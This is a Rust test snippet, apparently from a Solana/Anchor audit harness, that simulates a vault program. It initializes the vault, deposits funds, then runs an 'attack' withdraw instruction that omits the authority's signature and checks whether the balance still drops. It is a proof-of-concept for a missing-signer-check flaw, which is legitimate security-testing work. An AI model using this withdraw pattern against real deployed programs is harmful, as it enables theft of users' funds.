let recipient = Pubkey::new_unique();
let (vault_pda, _bump) = Pubkey::find_program_address(&[b"vault", authority.as_ref()], &env.program_id);

let authority_account = wallet(10_000_000_000);
let recipient_account = wallet(1_000_000_000);
let vault_account = empty_account();
let system_program = system_program_account();

// Baseline: initialize
let ix_init = env.anchor_ix("initialize", &(), vec![
    AccountMeta::new(vault_pda, false),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(system_program.0, false),
]);
let accounts_init = vec![
    (vault_pda, vault_account.clone()),
    (authority, authority_account.clone()),
    system_program.clone(),
];
let r_init = env.baseline("initialize vault", &ix_init, &accounts_init);

// Baseline: deposit
let deposit_amount = 5_000_000_000u64;
let ix_deposit = env.anchor_ix("deposit", &deposit_amount, vec![
    AccountMeta::new(vault_pda, false),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(system_program.0, false),
]);
let accounts_deposit = vec![
    (vault_pda, after(&r_init, &vault_pda).clone()),
    (authority, after(&r_init, &authority).clone()),
    system_program.clone(),
];
let r_deposit = env.baseline("deposit funds", &ix_deposit, &accounts_deposit);

// Ataque: withdraw sem assinatura da autoridade
let withdraw_amount = 1_000_000_000u64;
let ix_attack = env.anchor_ix("withdraw", &withdraw_amount, vec![
    AccountMeta::new(vault_pda, false),
    AccountMeta::new_readonly(authority, false),
    AccountMeta::new(recipient, false),
]);
let accounts_attack = vec![
    (vault_pda, after(&r_deposit, &vault_pda).clone()),
    (authority, after(&r_deposit, &authority).clone()),
    (recipient, recipient_account.clone()),
];
let r_attack = env.attack("withdraw without authority signature", &ix_attack, &accounts_attack);

if r_attack.program_result == ProgramResult::Success {
    let vault_after = after(&r_attack, &vault_pda);
    let vault_balance_after = read_u64(vault_after.data(), 40);
    env.effect("vault balance decreased without authority signature", vault_balance_after == 4_000_000_000);
}
